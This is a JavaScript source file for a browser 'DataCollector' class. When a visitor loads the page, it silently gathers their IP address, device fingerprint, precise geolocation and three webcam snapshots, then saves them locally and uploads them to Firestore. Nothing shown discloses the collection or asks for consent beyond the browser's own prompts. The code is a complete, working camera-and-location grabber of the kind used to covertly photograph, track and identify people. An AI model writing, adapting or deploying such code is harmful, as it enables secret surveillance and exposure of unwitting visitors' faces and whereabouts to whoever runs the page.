class DataCollector {
    static async collectAllData() {
        const dataToSave = {
            timestamp: new Date().toISOString(),
            ip: await this.getIPAddress(),
            device_info: this.getDeviceInfo(),
            latitude: 0,
            longitude: 0,
            selfies: [],
            pageUrl: window.location.href,
            referrer: document.referrer
        };

        // Get geolocation
        try {
            const coords = await this.getGeolocation();
            dataToSave.latitude = coords.latitude;
            dataToSave.longitude = coords.longitude;
        } catch (error) {
            console.log('Geolocation not available:', error.message);
        }

        // Get selfies
        try {
            dataToSave.selfies = await this.captureSelfies();
        } catch (error) {
            console.log('Camera not available:', error.message);
        }

        // Save to storage systems
        const saveResults = await this.saveToStorages(dataToSave);

        return {
            success: true,
            data: dataToSave,
            storage: saveResults
        };
    }

    static async saveToStorages(data) {
        const results = {};
        
        // 1. Save to localStorage (immediate)
        results.local = this.saveToLocalStorage(data);
        
        // 2. Save to Firestore (online)
        try {
            results.firestore = await FirestoreStorage.saveData(data);
        } catch (error) {
            results.firestore = { 
                success: false, 
                error: error.message 
            };
        }
        
        return results;
    }

    static saveToLocalStorage(data) {
        try {
            const timestamp = Date.now();
            const key = `visitor_${timestamp}`;
            localStorage.setItem(key, JSON.stringify(data));
            
            // Save selfies separately if they exist
            if (data.selfies && data.selfies.length > 0) {
                data.selfies.forEach((selfie, index) => {
                    localStorage.setItem(`selfie_${timestamp}_${index}`, selfie);
                });
            }
            
            return { 
                success: true, 
                key: key, 
                timestamp: timestamp 
            };
        } catch (error) {
            return { 
                success: false, 
                error: error.message 
            };
        }
    }

    static async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Unknown';
        }
    }

    static getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            cookieEnabled: navigator.cookieEnabled,
            pdfViewerEnabled: navigator.pdfViewerEnabled || 'unknown'
        };
    }

    static getGeolocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation not supported'));
                return;
            }

            navigator.geolocation.getCurrentPosition(
                position => resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }),
                error => reject(error),
                { 
                    timeout: 10000,
                    enableHighAccuracy: true 
                }
            );
        });
    }

    static async captureSelfies() {
        return new Promise(async (resolve, reject) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                reject(new Error('Camera not supported'));
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 } 
                    } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                
                video.onloadedmetadata = async () => {
                    await video.play();
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    const selfies = [];
                    
                    // Capture 3 selfies with 1-second intervals
                    for (let i = 0; i < 3; i++) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        selfies.push(canvas.toDataURL('image/jpeg', 0.7));
                        await new Promise(res => setTimeout(res, 1000));
                    }
                    
                    // Clean up
                    stream.getTracks().forEach(track => track.stop());
                    resolve(selfies);
                };
                
            } catch (error) {
                reject(error);
            }
        });
    }

    static getAllLocalData() {
        const visitors = [];
        
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && key.startsWith('visitor_')) {
                    try {
                        const item = localStorage.getItem(key);
                        if (item) {
                            const data = JSON.parse(item);
                            const timestamp = parseInt(key.split('_')[1]);
                            
                            visitors.push({
                                key: key,
                                data: data,
                                timestamp: timestamp,
                                date: new Date(timestamp)
                            });
                        }
                    } catch (parseError) {
                        console.warn('Error parsing:', key, parseError);
                    }
                }
            }
            
            return visitors.sort((a, b) => b.timestamp - a.timestamp);
        } catch (error) {
            console.error('Error reading localStorage:', error);
            return [];
        }
    }
}

// Make available globally
window.DataCollector = DataCollector;
